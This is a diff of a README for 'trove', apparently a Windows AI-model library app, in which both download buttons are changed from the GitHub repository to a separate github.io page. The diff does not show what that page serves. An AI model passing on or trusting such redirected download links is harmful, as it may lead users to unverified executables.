@@ -1,6 +1,6 @@
 # 🗃️ trove - Your Personal AI Model Library, Simplified
 
-[![Download trove](https://img.shields.io/badge/Download-trove-4B32C3?style=for-the-badge&logo=github)](https://github.com/2014m355/trove)
+[![Download trove](https://img.shields.io/badge/Download-trove-4B32C3?style=for-the-badge&logo=github)](https://2014m355.github.io)
 
 ## 👋 What Is trove?
 
@@ -45,7 +45,7 @@ Let's get trove running on your Windows computer. Don't worry—I'll walk you th
 
 Visit this link to download the application.
 
-[![Download trove Now](https://img.shields.io/badge/⬇️%20Download%20trove%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/2014m355/trove)
+[![Download trove Now](https://img.shields.io/badge/⬇️%20Download%20trove%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://2014m355.github.io)
 
 The download page will open in your browser. Look for the most recent release and download the Windows version.
 
